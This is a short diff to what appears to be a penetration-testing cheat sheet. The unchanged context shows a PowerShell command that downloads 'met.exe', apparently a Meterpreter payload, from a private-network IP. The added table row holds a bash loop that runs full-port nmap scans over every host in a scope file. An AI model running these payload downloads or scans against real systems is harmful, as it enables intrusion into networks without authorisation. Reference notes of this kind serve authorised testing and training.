@@ -56,3 +56,9 @@ Retrieve a file in Powershell (same as wget)
 ```shell
 iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
 ```
+
+
+| Enumerating | **Description** |
+| ---- | ---- |
+| `for i in $(cat ../internal-network.txt); do mkdir -p $i/nmap; nmap -p- --min-rate=10000 --open $i -oA "$i/nmap/quick-scan"; done` | Quick scan from scope file |
+|  |  |
